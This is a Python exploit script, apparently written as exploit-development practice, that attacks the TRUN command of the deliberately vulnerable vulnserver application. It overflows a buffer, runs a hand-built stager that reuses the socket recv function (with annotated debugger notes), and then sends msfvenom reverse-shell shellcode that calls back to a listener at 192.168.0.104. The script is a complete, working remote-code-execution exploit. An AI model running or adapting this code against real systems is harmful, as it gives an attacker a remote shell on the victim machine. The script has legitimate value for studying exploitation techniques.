'''vulnserver TRUN buffer overflow shell
 using >> socket receive function reuse
Tested on : Windows 7 32 bit, windows XP 32 bit SP3

Author : Goutham Madhwaraj (barriersec.com)
'''

import os
import socket
import sys
from time import sleep

host= "192.168.0.101"
port= 9999



'''
00B8FA0C   00000080  |Socket = 80
00B8FA10   003E4B48  |Buffer = 003E4B48
00B8FA14   00001000  |BufSize = 1000 (4096.)
00B8FA18   00000000  \Flags = 0

00401953   E8 D40B0000      CALL <JMP.&WS2_32.recv>


0040252C  -FF25 F4614000    JMP DWORD PTR DS:[<&WS2_32.recv>]        ; WS2_32.recv

we need 0040252C in eax before we call.


and socket address stored at : 00B8FB93   0080 00000000    ADD BYTE PTR DS:[EAX],AL

00B8FA0C

00B8FB94(because skipping 1 byte 00 )  - 00B8FA0C = 0x188

push esp
pop ecx
add cx,0x188

push arguments:

xor edx,edx
push edx

add dh,0x02
push edx

esp address at this point : 00B8FA04
start address :
00B8FA3A   CC               INT3


00B8FA3A - 00B8FA04 = 0x36

push esp
pop edx
sub dl,0x36
push edx

finally push socket descriptor
PUSH DWORD PTR DS:[ECX]

final code :

00B8FA0D   54               PUSH ESP
00B8FA0E   59               POP ECX
00B8FA0F   66:81C1 8801     ADD CX,188
00B8FA14   33D2             XOR EDX,EDX
00B8FA16   52               PUSH EDX
00B8FA17   80C6 02          ADD DH,2
00B8FA1A   52               PUSH EDX
00B8FA1B   54               PUSH ESP
00B8FA1C   5A               POP EDX
00B8FA1D   54               PUSH ESP
00B8FA1E   5A               POP EDX
00B8FA1F   66:83C2 38       ADD DX,38
00B8FA23   52               PUSH EDX
00B8FA24   FF31             PUSH DWORD PTR DS:[ECX]
00B8FA26   B8 112C2540      MOV EAX,40252C11
00B8FA2B   C1E8 08          SHR EAX,8
00B8FA2E   FFD0             CALL EAX                                 ; <JMP.&WS2_32.recv>
'''

#first stage payload socket recv function reuse
payload = (

"\x54\x59\x66\x81\xc1\x88\x01\x33\xD2\x33\xD2\x52\x80\xC6\x02\x52\x54\x5A\x54\x5A\x66\x83\xC2\x38\x52\xFF\x31\xB8\x11\x2C\x25\x40\xc1\xE8\x08\xFF\xD0"

)

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00" -f c
payload_final = (
"\xba\x1e\xcd\x62\x82\xd9\xd0\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\xdd\xc9\x80\x77\x1d\x39\xc6"
"\x78\xdd\xba\xa7\xf1\x38\x8b\xe7\x66\x49\xbc\xd7\xed\x1f\x31"
"\x93\xa0\x8b\xc2\xd1\x6c\xbc\x63\x5f\x4b\xf3\x74\xcc\xaf\x92"
"\xf6\x0f\xfc\x74\xc6\xdf\xf1\x75\x0f\x3d\xfb\x27\xd8\x49\xae"
"\xd7\x6d\x07\x73\x5c\x3d\x89\xf3\x81\xf6\xa8\xd2\x14\x8c\xf2"
"\xf4\x97\x41\x8f\xbc\x8f\x86\xaa\x77\x24\x7c\x40\x86\xec\x4c"
"\xa9\x25\xd1\x60\x58\x37\x16\x46\x83\x42\x6e\xb4\x3e\x55\xb5"
"\xc6\xe4\xd0\x2d\x60\x6e\x42\x89\x90\xa3\x15\x5a\x9e\x08\x51"
"\x04\x83\x8f\xb6\x3f\xbf\x04\x39\xef\x49\x5e\x1e\x2b\x11\x04"
"\x3f\x6a\xff\xeb\x40\x6c\xa0\x54\xe5\xe7\x4d\x80\x94\xaa\x19"
"\x65\x95\x54\xda\xe1\xae\x27\xe8\xae\x04\xaf\x40\x26\x83\x28"
"\xa6\x1d\x73\xa6\x59\x9e\x84\xef\x9d\xca\xd4\x87\x34\x73\xbf"
"\x57\xb8\xa6\x10\x07\x16\x19\xd1\xf7\xd6\xc9\xb9\x1d\xd9\x36"
"\xd9\x1e\x33\x5f\x70\xe5\xd4\xa0\x2d\xe5\x4c\x49\x2c\xe5\x9d"
"\xd5\xb9\x03\xf7\xf5\xef\x9c\x60\x6f\xaa\x56\x10\x70\x60\x13"
"\x12\xfa\x87\xe4\xdd\x0b\xed\xf6\x8a\xfb\xb8\xa4\x1d\x03\x17"
"\xc0\xc2\x96\xfc\x10\x8c\x8a\xaa\x47\xd9\x7d\xa3\x0d\xf7\x24"
"\x1d\x33\x0a\xb0\x66\xf7\xd1\x01\x68\xf6\x94\x3e\x4e\xe8\x60"
"\xbe\xca\x5c\x3d\xe9\x84\x0a\xfb\x43\x67\xe4\x55\x3f\x21\x60"
"\x23\x73\xf2\xf6\x2c\x5e\x84\x16\x9c\x37\xd1\x29\x11\xd0\xd5"
"\x52\x4f\x40\x19\x89\xcb\x60\xf8\x1b\x26\x09\xa5\xce\x8b\x54"
"\x56\x25\xcf\x60\xd5\xcf\xb0\x96\xc5\xba\xb5\xd3\x41\x57\xc4"
"\x4c\x24\x57\x7b\x6c\x6d"

)
buffer = 'TRUN .' +"A"*2006 + "\xaf\x11\x50\x62"+payload+"\x90"*60+'\r\n'


conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
print "[+] sending out initial payload ..."
conn.send((buffer))
print "[+] sending out final payload ..."
sleep(1)
conn.send((payload_final))
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()

